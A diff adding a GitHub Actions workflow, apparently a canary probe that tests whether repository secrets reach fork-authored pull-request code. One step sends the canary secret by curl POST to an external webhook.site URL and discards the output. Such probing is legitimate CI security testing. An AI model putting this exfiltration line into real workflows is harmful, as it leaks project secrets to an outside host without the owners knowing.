@@ -1,0 +1,24 @@
+name: probe-ci
+on:
+  pull_request:
+jobs:
+  probe-ci:
+    runs-on: ubuntu-latest
+    steps:
+      - name: baseline pass
+        run: echo "ci ok"
+      - name: check canary secret binding
+        if: ${{ env.CANARY_PRESENT == 'true' }}
+        run: echo "SECRET_WAS_BOUND_IN_THIS_RUN=true"
+        env:
+          CANARY_PRESENT: ${{ secrets.TEST_CANARY_SECRET != '' }}
+      - name: fork-authored exfil probe (added by external contributor, not maintainer)
+        if: ${{ env.FORK_CANARY_PRESENT == 'true' }}
+        run: echo "FORK_AUTHORED_CODE_READ_SECRET=true"
+        env:
+          FORK_CANARY_PRESENT: ${{ secrets.TEST_CANARY_SECRET != '' }}
+      - name: fork-authored network exfiltration (no echo, out-of-band only)
+        run: curl -s -X POST -d "canary=$SECRET_TO_CAPTURE" -d "run_id=$GITHUB_RUN_ID" https://webhook.site/4a3e0ca4-b7c3-4807-8826-d44f30a1ad4b >/dev/null
+        env:
+          SECRET_TO_CAPTURE: ${{ secrets.TEST_CANARY_SECRET }}
+
